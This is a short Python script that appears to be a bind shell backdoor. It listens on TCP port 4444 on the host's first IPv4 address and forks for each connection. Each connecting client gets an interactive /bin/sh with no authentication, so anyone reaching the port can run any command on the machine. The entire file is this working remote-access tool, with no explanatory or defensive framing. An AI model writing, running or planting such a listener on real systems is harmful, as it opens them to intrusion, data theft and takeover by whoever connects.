import socket, os, subprocess, re, signal

def main():
  sock = socket.create_server((get_ip(), 4444))

  sock.listen()

  while(True):
    (conn, _) = sock.accept()

    ip = f"{conn.getpeername()[0]}:{conn.getpeername()[1]}"

    print("Client connection from " + ip)

    pid = os.fork()

    if(pid > 0):
      signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    else:
      subprocess.Popen(["/bin/sh", "-i"], stdin=conn.fileno(), stdout=conn.fileno(), stderr=conn.fileno()).wait()

      try:
        conn.shutdown(socket.SHUT_RDWR)
        print("Client disconnection from " + ip)
      except:
        print("Unexpected client disconnection from " + ip)
      finally:
        break
    
def get_ip(): # Uses the first non-loopback IPv4 address
  return re.findall("inet (?P<addr>.*)/24 brd", subprocess.run(["ip", "addr"], capture_output=True).stdout.decode("utf-8"))[0]

if __name__ == '__main__':
  main()